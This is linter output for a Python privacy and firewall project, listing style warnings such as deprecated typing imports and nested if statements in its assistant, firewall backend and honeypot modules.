UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:32:32
   |
30 |     """
31 |
32 |     def __init__(self, config: Dict[str, Any], god_tier_encryption):
   |                                ^^^^
33 |         """
34 |         Initialize Thirsty Consigliere with MAXIMUM ALLOWED DESIGN.
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:82:31
   |
80 |         # Ephemeral context window (memory only, never persisted)
81 |         # MAXIMUM ALLOWED DESIGN: Dual naming for compatibility
82 |         self._context_window: List[Dict[str, Any]] = []
   |                               ^^^^
83 |         self._ephemeral_context: List[Dict[str, Any]] = (
84 |             self._context_window
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:82:36
   |
80 |         # Ephemeral context window (memory only, never persisted)
81 |         # MAXIMUM ALLOWED DESIGN: Dual naming for compatibility
82 |         self._context_window: List[Dict[str, Any]] = []
   |                                    ^^^^
83 |         self._ephemeral_context: List[Dict[str, Any]] = (
84 |             self._context_window
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:83:34
   |
81 |         # MAXIMUM ALLOWED DESIGN: Dual naming for compatibility
82 |         self._context_window: List[Dict[str, Any]] = []
83 |         self._ephemeral_context: List[Dict[str, Any]] = (
   |                                  ^^^^
84 |             self._context_window
85 |         )  # Alias for tests
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:83:39
   |
81 |         # MAXIMUM ALLOWED DESIGN: Dual naming for compatibility
82 |         self._context_window: List[Dict[str, Any]] = []
83 |         self._ephemeral_context: List[Dict[str, Any]] = (
   |                                       ^^^^
84 |             self._context_window
85 |         )  # Alias for tests
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:91:36
   |
90 |         # Active capabilities (user must explicitly enable)
91 |         self._active_capabilities: Dict[str, bool] = {}
   |                                    ^^^^
92 |
93 |         self._active = False
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:171:36
    |
170 |     def assist(
171 |         self, query: str, context: Optional[Dict[str, Any]] = None
    |                                    ^^^^^^^^^^^^^^^^^^^^^^^^
172 |     ) -> Dict[str, Any]:
173 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:171:45
    |
170 |     def assist(
171 |         self, query: str, context: Optional[Dict[str, Any]] = None
    |                                             ^^^^
172 |     ) -> Dict[str, Any]:
173 |         """
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:172:10
    |
170 |     def assist(
171 |         self, query: str, context: Optional[Dict[str, Any]] = None
172 |     ) -> Dict[str, Any]:
    |          ^^^^
173 |         """
174 |         Process user query with privacy-first approach.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:278:39
    |
276 |         return response
277 |
278 |     def _minimize_data(self, context: Dict[str, Any]) -> Dict[str, Any]:
    |                                       ^^^^
279 |         """
280 |         Apply data minimization - keep only what's strictly needed.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:278:58
    |
276 |         return response
277 |
278 |     def _minimize_data(self, context: Dict[str, Any]) -> Dict[str, Any]:
    |                                                          ^^^^
279 |         """
280 |         Apply data minimization - keep only what's strictly needed.
    |
help: Replace with `dict`

SIM114 [*] Combine `if` branches using logical `or` operator
   --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:293:13
    |
291 |                   minimized["has_ip"] = True  # Just flag, not value
292 |               # Keep minimal data types
293 | /             elif key in ["page_title", "language"]:
294 | |                 minimized[key] = value
295 | |             # Skip identifiers and privacy-sensitive fields
296 | |             elif key not in [
297 | |                 "user_id",
298 | |                 "session_id",
299 | |                 "tracking_id",
300 | |                 "user_agent",
301 | |                 "timestamp",
302 | |             ]:
303 | |                 minimized[key] = value
    | |______________________________________^
304 |
305 |           return minimized
    |
help: Combine `if` branches

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:317:38
    |
315 |             return "unknown"
316 |
317 |     def _add_to_context(self, entry: Dict[str, Any]):
    |                                      ^^^^
318 |         """Add to ephemeral context window (memory only)"""
319 |         self._context_window.append(entry)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:325:53
    |
323 |             self._context_window.pop(0)
324 |
325 |     def _process_locally(self, query: str, context: Dict[str, Any]) -> Dict[str, Any]:
    |                                                     ^^^^
326 |         """
327 |         Process query locally (on-device).
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:325:72
    |
323 |             self._context_window.pop(0)
324 |
325 |     def _process_locally(self, query: str, context: Dict[str, Any]) -> Dict[str, Any]:
    |                                                                        ^^^^
326 |         """
327 |         Process query locally (on-device).
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:394:64
    |
392 |         }
393 |
394 |     def _generate_cautious_response(self, query: str, context: Dict[str, Any]) -> str:
    |                                                                ^^^^
395 |         """Generate cautious, privacy-preserving response"""
396 |         query_lower = query.lower()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\consigliere_engine.py:427:29
    |
425 |         )
426 |
427 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
428 |         """
429 |         Get Consigliere status with MAXIMUM ALLOWED DESIGN.
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\privacy_checker.py:7:1
  |
5 | import logging
6 | import re
7 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\privacy_checker.py:25:36
   |
24 |     def audit_query(
25 |         self, query: str, context: Optional[Dict[str, Any]] = None
   |                                    ^^^^^^^^^^^^^^^^^^^^^^^^
26 |     ) -> Dict[str, Any]:
27 |         """Audit a query for privacy concerns"""
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\privacy_checker.py:25:45
   |
24 |     def audit_query(
25 |         self, query: str, context: Optional[Dict[str, Any]] = None
   |                                             ^^^^
26 |     ) -> Dict[str, Any]:
27 |         """Audit a query for privacy concerns"""
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\consigliere\privacy_checker.py:26:10
   |
24 |     def audit_query(
25 |         self, query: str, context: Optional[Dict[str, Any]] = None
26 |     ) -> Dict[str, Any]:
   |          ^^^^
27 |         """Audit a query for privacy concerns"""
28 |         concerns = []
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:11:1
   |
 9 | import subprocess
10 | from abc import ABC, abstractmethod
11 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:11:1
   |
 9 | import subprocess
10 | from abc import ABC, abstractmethod
11 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:17:32
   |
15 |     """Abstract base class for firewall backend implementations"""
16 |
17 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
18 |         self.config = config
19 |         self.logger = logging.getLogger(self.__class__.__name__)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:30:30
   |
29 |     @abstractmethod
30 |     def add_rule(self, rule: Dict[str, Any]) -> bool:
   |                              ^^^^
31 |         """Add firewall rule"""
32 |         pass
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:54:33
   |
52 |         pass
53 |
54 |     def get_statistics(self) -> Dict[str, Any]:
   |                                 ^^^^
55 |         """Get firewall statistics"""
56 |         return {
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:69:32
   |
67 |     """
68 |
69 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
70 |         super().__init__(config)
71 |         self.table_name = config.get("table", "thirstys_filter")
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:129:30
    |
127 |             return False
128 |
129 |     def add_rule(self, rule: Dict[str, Any]) -> bool:
    |                              ^^^^
130 |         """
131 |         Add nftables rule
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:236:32
    |
234 |     """
235 |
236 |     def __init__(self, config: Dict[str, Any]):
    |                                ^^^^
237 |         super().__init__(config)
238 |         self.rule_prefix = config.get("rule_prefix", "ThirstysWaterfall")
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:273:30
    |
271 |             return False
272 |
273 |     def add_rule(self, rule: Dict[str, Any]) -> bool:
    |                              ^^^^
274 |         """
275 |         Add Windows Firewall rule
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:406:32
    |
404 |     """
405 |
406 |     def __init__(self, config: Dict[str, Any]):
    |                                ^^^^
407 |         super().__init__(config)
408 |         self.anchor_name = config.get("anchor", "thirstys")
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:466:41
    |
464 |             return False
465 |
466 |     def _convert_to_pf_rule(self, rule: Dict[str, Any]) -> str:
    |                                         ^^^^
467 |         """
468 |         Convert rule dict to PF rule syntax
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:492:30
    |
490 |         return pf_rule
491 |
492 |     def add_rule(self, rule: Dict[str, Any]) -> bool:
    |                              ^^^^
493 |         """
494 |         Add PF rule
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:590:32
    |
589 |     @staticmethod
590 |     def create_backend(config: Dict[str, Any] = None) -> Optional[FirewallBackend]:
    |                                ^^^^
591 |         """
592 |         Create appropriate firewall backend for current platform
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:590:58
    |
589 |     @staticmethod
590 |     def create_backend(config: Dict[str, Any] = None) -> Optional[FirewallBackend]:
    |                                                          ^^^^^^^^^^^^^^^^^^^^^^^^^
591 |         """
592 |         Create appropriate firewall backend for current platform
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\backends.py:624:37
    |
623 |     @staticmethod
624 |     def get_available_backends() -> List[str]:
    |                                     ^^^^
625 |         """Get list of available firewall backends on this system"""
626 |         available = []
    |
help: Replace with `list`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\base.py:5:1
  |
3 | import logging
4 | from abc import ABC, abstractmethod
5 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\base.py:11:32
   |
 9 |     """Base class for all firewall implementations"""
10 |
11 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
12 |         self.config = config
13 |         self.enabled = config.get("enabled", True)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\base.py:35:30
   |
34 |     @abstractmethod
35 |     def add_rule(self, rule: Dict[str, Any]):
   |                              ^^^^
36 |         """Add a firewall rule"""
37 |         pass
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\base.py:45:38
   |
44 |     @abstractmethod
45 |     def process_packet(self, packet: Dict[str, Any]) -> bool:
   |                                      ^^^^
46 |         """
47 |         Process a packet through the firewall.
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\base.py:58:33
   |
56 |         return self._active
57 |
58 |     def get_statistics(self) -> Dict[str, int]:
   |                                 ^^^^
59 |         """Get firewall statistics"""
60 |         return self._statistics.copy()
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\circuit_level.py:4:1
  |
3 | import time
4 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | from .base import FirewallBase
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\circuit_level.py:15:32
   |
13 |     """
14 |
15 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
16 |         super().__init__(config)
17 |         self.proxy_timeout = config.get("proxy_timeout", 30)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\circuit_level.py:31:30
   |
29 |         self._sessions.clear()
30 |
31 |     def add_rule(self, rule: Dict[str, Any]):
   |                              ^^^^
32 |         """Add circuit-level rule"""
33 |         self._rules.append(rule)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\circuit_level.py:39:38
   |
37 |         self._rules = [r for r in self._rules if r.get("id") != rule_id]
38 |
39 |     def process_packet(self, packet: Dict[str, Any]) -> bool:
   |                                      ^^^^
40 |         """Process packet through circuit-level inspection"""
41 |         if not self._active:
   |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\circuit_level.py:59:9
   |
58 |           # Check if this is a new connection attempt (SYN)
59 | /         if packet.get("flags") == "SYN":
60 | |             # Validate handshake
61 | |             if self._validate_handshake(packet):
   | |________________________________________________^
62 |                   self._sessions[session_id] = {
63 |                       "established": time.time(),
   |
help: Combine `if` statements using `and`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\circuit_level.py:73:39
   |
71 |         return False
72 |
73 |     def _get_session_id(self, packet: Dict[str, Any]) -> str:
   |                                       ^^^^
74 |         """Generate unique session ID"""
75 |         return f"{packet.get('src_ip')}:{packet.get('src_port')}->{packet.get('dst_ip')}:{packet.get('dst_port')}"
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\circuit_level.py:77:43
   |
75 |         return f"{packet.get('src_ip')}:{packet.get('src_port')}->{packet.get('dst_ip')}:{packet.get('dst_port')}"
76 |
77 |     def _validate_handshake(self, packet: Dict[str, Any]) -> bool:
   |                                           ^^^^
78 |         """Validate TCP handshake"""
79 |         # Simplified validation
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\circuit_level.py:82:38
   |
80 |         return packet.get("protocol") == "tcp"
81 |
82 |     def get_active_sessions(self) -> Dict[str, Any]:
   |                                      ^^^^
83 |         """Get all active sessions"""
84 |         return self._sessions.copy()
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\cloud.py:3:1
  |
1 | """Cloud Firewall implementation"""
2 |
3 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4 |
5 | from .base import FirewallBase
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\cloud.py:14:32
   |
12 |     """
13 |
14 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
15 |         super().__init__(config)
16 |         self.distributed = config.get("distributed", True)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\cloud.py:40:30
   |
38 |         ]
39 |
40 |     def add_rule(self, rule: Dict[str, Any]):
   |                              ^^^^
41 |         """Add cloud firewall rule"""
42 |         self._rules.append(rule)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\cloud.py:52:38
   |
50 |         self._rules = [r for r in self._rules if r.get("id") != rule_id]
51 |
52 |     def process_packet(self, packet: Dict[str, Any]) -> bool:
   |                                      ^^^^
53 |         """Process packet through cloud firewall"""
54 |         if not self._active:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\cloud.py:75:43
   |
73 |         return True
74 |
75 |     def _check_geo_location(self, packet: Dict[str, Any]) -> bool:
   |                                           ^^^^
76 |         """Check geographic location restrictions"""
77 |         packet.get("src_ip", "")
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\cloud.py:88:39
   |
86 |         return True
87 |
88 |     def _is_ddos_attack(self, packet: Dict[str, Any]) -> bool:
   |                                       ^^^^
89 |         """Detect DDoS attacks"""
90 |         # Simplified DDoS detection
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\cloud.py:107:50
    |
105 |         return False
106 |
107 |     def _check_threat_intelligence(self, packet: Dict[str, Any]) -> bool:
    |                                                  ^^^^
108 |         """Check against cloud threat intelligence"""
109 |         src_ip = packet.get("src_ip")
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\cloud.py:120:35
    |
118 |         return True
119 |
120 |     def get_cloud_status(self) -> Dict[str, Any]:
    |                                   ^^^^
121 |         """Get cloud firewall status"""
122 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\hardware.py:3:1
  |
1 | """Hardware Firewall implementation"""
2 |
3 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4 |
5 | from .base import FirewallBase
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\hardware.py:14:32
   |
12 |     """
13 |
14 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
15 |         super().__init__(config)
16 |         self.bypass_mode = config.get("bypass_mode", False)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\hardware.py:35:30
   |
33 |         self.logger.debug("Initializing hardware filtering engine")
34 |
35 |     def add_rule(self, rule: Dict[str, Any]):
   |                              ^^^^
36 |         """Add hardware firewall rule"""
37 |         self._rules.append(rule)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\hardware.py:47:38
   |
45 |         ]
46 |
47 |     def process_packet(self, packet: Dict[str, Any]) -> bool:
   |                                      ^^^^
48 |         """Process packet at hardware level"""
49 |         if not self._active or self.bypass_mode:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\hardware.py:70:41
   |
68 |         return True
69 |
70 |     def _hardware_inspect(self, packet: Dict[str, Any]) -> bool:
   |                                         ^^^^
71 |         """Hardware-level packet inspection"""
72 |         # Check packet integrity
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\hardware.py:84:23
   |
83 |     def _match_hardware_rule(
84 |         self, packet: Dict[str, Any], rule: Dict[str, Any]
   |                       ^^^^
85 |     ) -> bool:
86 |         """Match packet against hardware rule"""
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\hardware.py:84:45
   |
83 |     def _match_hardware_rule(
84 |         self, packet: Dict[str, Any], rule: Dict[str, Any]
   |                                             ^^^^
85 |     ) -> bool:
86 |         """Match packet against hardware rule"""
   |
help: Replace with `dict`

SIM103 Return the negated condition directly
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\hardware.py:89:9
   |
87 |           if "mac_src" in rule and packet.get("mac_src") != rule["mac_src"]:
88 |               return False
89 | /         if "mac_dst" in rule and packet.get("mac_dst") != rule["mac_dst"]:
90 | |             return False
91 | |         return True
   | |___________________^
92 |
93 |       def _check_mac_address(self, packet: Dict[str, Any]) -> bool:
   |
help: Inline condition

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\hardware.py:93:42
   |
91 |         return True
92 |
93 |     def _check_mac_address(self, packet: Dict[str, Any]) -> bool:
   |                                          ^^^^
94 |         """Validate MAC addresses"""
95 |         # Simplified MAC validation
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\hardware.py:98:35
    |
 96 |         return True
 97 |
 98 |     def _check_vlan(self, packet: Dict[str, Any]) -> bool:
    |                                   ^^^^
 99 |         """Validate VLAN tags"""
100 |         # Simplified VLAN validation
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:28:1
   |
26 | from datetime import datetime
27 | from enum import Enum
28 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:28:1
   |
26 | from datetime import datetime
27 | from enum import Enum
28 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:28:1
   |
26 | from datetime import datetime
27 | from enum import Enum
28 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:62:22
   |
60 |     violation_count: int = 0
61 |     threat_level: ThreatLevel = ThreatLevel.SCOUT
62 |     accessed_decoys: Set[str] = field(default_factory=set)
   |                      ^^^
63 |     attack_patterns: List[str] = field(default_factory=list)
64 |     cognitive_overload_score: float = 0.0
   |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:63:22
   |
61 |     threat_level: ThreatLevel = ThreatLevel.SCOUT
62 |     accessed_decoys: Set[str] = field(default_factory=set)
63 |     attack_patterns: List[str] = field(default_factory=list)
   |                      ^^^^
64 |     cognitive_overload_score: float = 0.0
   |
help: Replace with `list`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:75:19
   |
73 |     believability_score: float  # 0.0-1.0, how "real" it looks
74 |     access_count: int = 0
75 |     triggered_by: Set[str] = field(default_factory=set)
   |                   ^^^
76 |     is_hot: bool = False  # Currently being probed
   |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:101:32
    |
 99 |     """
100 |
101 |     def __init__(self, config: Optional[Dict] = None):
    |                                ^^^^^^^^^^^^^^
102 |         self.config = config or {}
103 |         self.logger = logging.getLogger(self.__class__.__name__)
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:101:41
    |
 99 |     """
100 |
101 |     def __init__(self, config: Optional[Dict] = None):
    |                                         ^^^^
102 |         self.config = config or {}
103 |         self.logger = logging.getLogger(self.__class__.__name__)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:106:25
    |
105 |         # Attacker tracking
106 |         self.attackers: Dict[str, Attacker] = {}
    |                         ^^^^
107 |
108 |         # Decoy deployment
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:109:22
    |
108 |         # Decoy deployment
109 |         self.decoys: Dict[str, DecoyNode] = {}
    |                      ^^^^
110 |         self.base_decoy_count = self.config.get("base_decoy_count", 10)
    |
help: Replace with `dict`

B007 Loop control variable `desc` not used within loop body
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:134:44
    |
132 |         ]
133 |
134 |         for i, (decoy_type, believability, desc) in enumerate(decoy_configs):
    |                                            ^^^^
135 |             for j in range(self.base_decoy_count // len(decoy_configs)):
136 |                 decoy_id = f"{decoy_type.value}_{i}_{j}"
    |
help: Rename unused `desc` to `_desc`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:146:61
    |
145 |     def detect_policy_violation(
146 |         self, source_ip: str, violation_type: str, details: Dict
    |                                                             ^^^^
147 |     ) -> Dict:
148 |         """
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:147:10
    |
145 |     def detect_policy_violation(
146 |         self, source_ip: str, violation_type: str, details: Dict
147 |     ) -> Dict:
    |          ^^^^
148 |         """
149 |         Detect policy violation and trigger swarm response
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:296:62
    |
294 |         return min(overload_score, 10.0)
295 |
296 |     def access_decoy(self, decoy_id: str, source_ip: str) -> Dict:
    |                                                              ^^^^
297 |         """
298 |         Record decoy access - attacker took the bait!
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:331:35
    |
329 |         }
330 |
331 |     def get_swarm_status(self) -> Dict:
    |                                   ^^^^
332 |         """Get current swarm defense status"""
333 |         threat_distribution = {level: 0 for level in ThreatLevel}
    |
help: Replace with `dict`

C420 [*] Unnecessary dict comprehension for iterable; use `dict.fromkeys` instead
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:333:31
    |
331 |     def get_swarm_status(self) -> Dict:
332 |         """Get current swarm defense status"""
333 |         threat_distribution = {level: 0 for level in ThreatLevel}
    |                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
334 |         for attacker in self.attackers.values():
335 |             threat_distribution[attacker.threat_level] += 1
    |
